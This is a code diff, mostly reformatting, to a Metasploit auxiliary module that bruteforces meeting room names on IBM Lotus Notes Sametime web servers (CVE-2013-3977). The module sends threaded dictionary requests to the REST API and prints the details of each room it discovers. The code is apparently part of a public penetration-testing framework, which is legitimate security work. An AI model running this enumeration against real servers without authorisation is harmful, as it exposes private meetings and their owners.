@@ -10,42 +10,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'IBM Lotus Notes Sametime Room Name Bruteforce',
-      'Description'    => %q{
-        This module bruteforces Sametime meeting room names via the IBM
-        Lotus Notes Sametime web interface.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM Lotus Notes Sametime Room Name Bruteforce',
+        'Description' => %q{
+          This module bruteforces Sametime meeting room names via the IBM
+          Lotus Notes Sametime web interface.
+        },
+        'Author' => [
           'kicks4kittens' # Metasploit module
         ],
-      'References' =>
-        [
+        'References' => [
           [ 'CVE', '2013-3977' ],
           [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
         ],
-      'DefaultOptions' =>
-        {
+        'DefaultOptions' => {
           'SSL' => true
         },
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-12-27'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-12-27',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443),
-        OptString.new('OWNER', [ true,  'The owner to bruteforce meeting room names for', '']),
-        OptPath.new('DICT', [ true,  'The path to the userinfo script' ]),
+        OptString.new('OWNER', [ true, 'The owner to bruteforce meeting room names for', '']),
+        OptPath.new('DICT', [ true, 'The path to the userinfo script' ]),
         OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])
-      ])
+      ]
+    )
 
     register_advanced_options(
       [
-        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
-        OptInt.new('Threads', [ true,  'Number of test threads', 10])
-      ])
+        OptInt.new('TIMING', [ true, 'Set pause between requests', 0]),
+        OptInt.new('Threads', [ true, 'Number of test threads', 10])
+      ]
+    )
   end
 
   def run
@@ -58,13 +65,13 @@ class MetasploitModule < Msf::Auxiliary
     @reqpath = normalize_uri(uri, '/restapi')
 
     res = send_request_cgi({
-      'uri'     =>  @reqpath,
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
+      'uri' => @reqpath,
+      'method' => 'GET',
+      'ctype' => 'text/html',
       'vars_get' => {
         'owner' => datastore['OWNER'],
         'permaName' => rval
-        }
+      }
     })
 
     unless res
@@ -89,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Beginning dictionary bruteforce using (#{datastore['Threads']} Threads)")
 
-    while(not @test_queue.empty?)
+    while (not @test_queue.empty?)
       t = []
       nt = datastore['Threads'].to_i
       nt = 1 if nt <= 0
@@ -114,11 +121,10 @@ class MetasploitModule < Msf::Auxiliary
             end
           end
         end
-      t.each {|x| x.join }
-
+        t.each { |x| x.join }
       rescue ::Timeout::Error
       ensure
-        t.each {|x| x.kill rescue nil }
+        t.each { |x| x.kill rescue nil }
       end
     end
   end
@@ -131,9 +137,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi({
-      'uri'     =>  @reqpath,
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
+      'uri' => @reqpath,
+      'method' => 'GET',
+      'ctype' => 'text/html',
       'vars_get' =>
         {
           'owner' => datastore['OWNER'],
@@ -157,36 +163,34 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def output_table(room_info, test_current)
-
     print_good("New meeting room found: #{test_current}")
 
     # print output table for discovered meeting rooms
     roomtbl = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-        'Header'  => "[IBM Lotus Sametime] Meeting Room #{test_current}",
-        'Prefix'  => "",
-        'Postfix' => "\n",
-        'Indent'  => 1,
-        'Columns' =>
-          [
-            "Key",
-            "Value"
-          ]
-      )
+      'Header' => "[IBM Lotus Sametime] Meeting Room #{test_current}",
+      'Prefix' => "",
+      'Postfix' => "\n",
+      'Indent' => 1,
+      'Columns' =>
+        [
+          "Key",
+          "Value"
+        ]
+    )
 
     room_info['results'][0].each do |k, v|
       if v.is_a?(Hash)
         # breakdown Hash
         roomtbl << [ k.to_s, '>>' ] # title line
-        v.each do | subk, subv |
-          roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
+        v.each do |subk, subv|
+          roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"] if not v.nil? or v.empty?
         end
       else
-        roomtbl << [ k.to_s, v.to_s || "-"]  unless v.nil?
+        roomtbl << [ k.to_s, v.to_s || "-"] unless v.nil?
       end
     end
     # output table
     print_good(roomtbl.to_s)
-
   end
 end
